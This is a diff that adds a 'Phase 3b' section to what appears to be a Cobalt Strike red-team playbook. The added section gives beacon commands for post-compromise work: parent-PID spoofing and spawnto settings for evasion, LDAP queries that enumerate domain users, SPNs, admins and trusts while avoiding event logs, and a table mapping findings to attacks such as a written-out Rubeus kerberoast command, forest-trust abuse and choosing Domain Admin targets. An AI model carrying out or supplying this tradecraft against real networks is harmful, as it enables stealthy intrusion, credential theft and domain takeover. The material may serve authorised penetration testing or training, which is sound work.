@@ -244,6 +244,45 @@ beacon> process_browser // GUI tab — confirm beacon is inside msedge.exe, chec
 
 ---
 
+## Phase 3b — Beacon Context + Priority Enumeration (EVERY beacon, EVERY time)
+
+Run this block on **every** new beacon before any attack action. ldapsearch is OPSEC-🟢SAFE
+(BOF — no child process, no event logs) and gives you the full domain picture in seconds.
+Do not skip it — you cannot make lateral movement or attack decisions without this data.
+
+```cs
+// Step 1 — beacon context (30 seconds)
+beacon> sleep 3 20
+beacon> ps
+beacon> ppid <explorer.exe PID>                         // interactive session — use explorer.exe
+// beacon> ppid <svchost.exe PID>                       // WinRM/service beacon — no explorer.exe, use svchost
+beacon> spawnto x64 %windir%\sysnative\werfault.exe
+beacon> getuid
+
+// Step 2 — domain enumeration (OPSEC-🟢SAFE — BOF, run immediately)
+// Combined query — users + computers + groups in one shot
+beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
+
+// Trust enumeration
+beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+```
+
+**Triage the output immediately — look for:**
+
+| Finding | Attack |
+|---------|--------|
+| `servicePrincipalName` set on user account | Kerberoast it — `execute-assembly Rubeus.exe kerberoast /user:<svc> /nowrap` |
+| `adminCount=1` with no DA/admin group | Leftover ACLs — check BloodHound for paths |
+| `trustPartner` results | Forest trust attack path — see Phase 13/14 |
+| Computer names — DB, FS, CS roles | Plan lateral movement targets |
+| `dyork`, `Administrator` in Domain Admins | DA accounts — final targets |
+
+> ⚠️ ldapsearch returns 0 results if beacon token is a WinRM/SCShell/WMI Type 3 network
+> logon — non-forwardable, cannot authenticate to DC. Fix: `make_token CONTOSO\user pass`
+> or `kerberos_ticket_use <kirbi>` before running ldapsearch.
+
+---
+
 ## Phase 4 — Persistence (User-Level — no admin)
 
 Deploy immediately after first beacon. Do this before privesc or lateral movement.
